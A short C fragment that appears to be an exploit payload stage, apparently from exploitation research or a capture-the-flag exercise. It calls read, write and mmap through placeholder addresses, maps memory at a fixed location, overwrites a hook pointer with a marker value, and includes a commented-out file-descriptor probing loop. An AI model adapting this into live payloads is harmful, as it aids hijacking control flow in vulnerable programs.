

void _start(){
    int (*read_fv)(int fd, void* buf, long long unsigned cnt) = READ_ADDR;
    int (*write_fv)(int fd, void* buf, long long unsigned cnt) = WRITE_ADDR;
    void* (*mmap_fv)(void* addr, long long unsigned length, int prot, int flags, int fd, long long unsigned offset) = MMAP_ADDR;
    char* stack_b = STACK_B;
    int msg = 0x41414141;
    int i=2;
    mmap_fv(0x100000, 0x1000, 6, 0x400032, 0, 0);
    //read_fv(0, stack_b, 8);
    write_fv(1, &msg, 4);
    long long unsigned *target = RANDOM_HOOK;
    *target = 0x4141414141;
    /*
    while(i++ < 65600){
        if(read_fv(i, stack_b, 1) > 0)
        {
            write_fv(1, &i, sizeof(int));
        }
    }*/
    write_fv(1, &msg, 4);

}
